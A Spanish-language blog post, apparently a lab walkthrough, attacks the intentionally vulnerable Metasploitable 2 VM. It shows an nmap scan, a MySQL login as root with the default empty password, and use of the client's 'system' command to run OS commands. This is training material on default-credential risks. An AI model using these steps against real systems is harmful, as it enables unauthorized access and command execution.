---
layout: post
title: Metasploitable 2, Atacando mysql
category: Hacking
comments: true
description: Las vulnerabilidades de seguridad no son solo fallos con software antiguo y vulnerable mediante exploits, sino que a veces son problemas relacionados con mostrar más cosas de las que se deberian mostrar, o con configuraciones con defecto, o peor, ambas a la vez. En este caso, la maquina virtual Metasploitable 2, tiene abierto el puerto 3306 del Mysql, y simplemente con eso podemos llegar a tener acceso de administrador en la maquina. 
tags:       

    - metasploitable2
    - metasploit
---

Las vulnerabilidades de seguridad no son solo fallos con software antiguo y vulnerable mediante exploits, sino que a veces son problemas relacionados con mostrar más cosas de las que se deberian mostrar, o con configuraciones con defecto, o peor, ambas a la vez.
En este caso, la maquina virtual Metasploitable 2, tiene abierto el puerto 3306 del Mysql, y simplemente con eso podemos llegar a tener acceso de administrador en la maquina. 

Para descargarte [Metasploitable 2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/){:target="_blank"}


## Puertos abiertos en Metasploitable 2

Antes de empezar es recomendable que veamos cuales son los puertos abiertos de nuestra maquina objetivo, aqui el puerto que nos interesa ahora es el 3306.

{% highlight sql linenos %}

Nmap scan report for 192.168.1.39
Host is up (0.00037s latency).
Not shown: 65501 closed ports
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
23/tcp    open     telnet
25/tcp    open     smtp
53/tcp    open     domain
80/tcp    open     http
111/tcp   open     rpcbind
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
512/tcp   open     exec
513/tcp   open     login
514/tcp   open     shell
1099/tcp  open     rmiregistry
1524/tcp  open     ingreslock
2049/tcp  open     nfs
2121/tcp  open     ccproxy-ftp
3306/tcp  open     mysql
3632/tcp  open     distccd
4239/tcp  filtered vrml-multi-use
5432/tcp  open     postgresql
5900/tcp  open     vnc
6000/tcp  open     X11
6667/tcp  open     irc
6697/tcp  open     ircs-u
8009/tcp  open     ajp13
8180/tcp  open     unknown
8787/tcp  open     msgsrvr
27242/tcp filtered unknown
34652/tcp open     unknown
35474/tcp filtered unknown
41271/tcp open     unknown
41542/tcp open     unknown
42726/tcp open     unknown
54399/tcp filtered unknown
MAC Address: 00:0C:29:D3:5F:CD (VMware)

Nmap done: 1 IP address (1 host up) scanned in 185.82 seconds

{% endhighlight %}

## Empezando

En Kali Linux y muchas otras distribuciones esta instalando el comando mysql, con ello nos podemos conectar a una base de datos mysql. El usuario y password por defecto en mysql es root y no tiene password, por ejemplo en sql server el usuario es sa y tampoco tiene password. 

Asi que desde terminal ejecuto este comando


{% highlight sql linenos %}

mysql -u root -p  --host=192.168.1.39 --port=3306

{% endhighlight %}


Y al ejecutar ese comando, nos pide un password, no le ponemos ninguno y ... estamos dentro.


<figure>
<img alt="Acceso root a metasploitable 2 después de entrar con claves de mysql por defecto" class="img img-responsive" src="/resources/images/mysql-login.png"/>
<figcaption>
Acceso root a metasploitable 2 después de entrar con claves de mysql por defecto
</figcaption>
</figure>

Y por dejar un servicio que no deberia ser visible y con usuarios por defecto, no solo tenemos acceso a toda la base de datos, sino que somos usuarios root, y podemos ejecutar cualquier comando. Para ello no hace falta más que usar el comando system y después usar el comando linux que queramos utilizar.

por ejemplo:

{% highlight sql linenos %}

system whoami

{% endhighlight %}


<figure>
<img alt="Acceso root a metasploitable 2 con mysql" class="img img-responsive" src="/resources/images/mysql-shell.png"/>
<figcaption>
Acceso root a metasploitable 2 con mysql
</figcaption>
</figure>
